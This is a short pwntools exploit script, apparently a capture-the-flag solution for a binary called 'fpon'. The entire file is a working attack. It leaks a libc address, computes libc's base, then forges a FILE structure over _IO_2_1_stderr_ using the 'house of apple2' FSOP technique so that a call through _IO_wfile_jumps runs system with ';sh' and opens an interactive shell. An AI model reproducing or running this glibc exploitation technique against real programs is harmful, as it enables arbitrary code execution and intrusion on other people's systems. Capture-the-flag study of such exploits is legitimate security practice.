from pwn import * 

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./fpon"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("", 9999)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()

# leak libc
ddebug("breakrva 0x001309\n breakrva 0x138c\n continue")
io.sendlineafter("Offset: ", str(0x20))
io.sendlineafter("Byte: ", str(0))
io.sendline(str(1).encode())
io.sendline(str(0x18).encode())

leak = u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
libc.address = leak - 0x212644
log.success("libc.address :-----> " + hex(libc.address))
stderr = libc.symbols["_IO_2_1_stderr_"]
io_wfile_jumps = libc.symbols['_IO_wfile_jumps']
sys_addr = libc.symbols['system']

# fsop, house of apple2
io.sendline(str(stderr).encode())
payload = p32(0xfffff7f5) + b";sh\x00" + p64(0)
payload+= p64(0)*2
payload+= p64(0) + p64(1)
payload+= b"\x00"*0x38 + p64(sys_addr) + b"\x00"*0x30 + p64(stderr-0x20)
payload+= b"\x00"*0x18 + p64(stderr) + p64(0) + p64(0) + p64(io_wfile_jumps)

io.sendline(payload)

io.interactive()
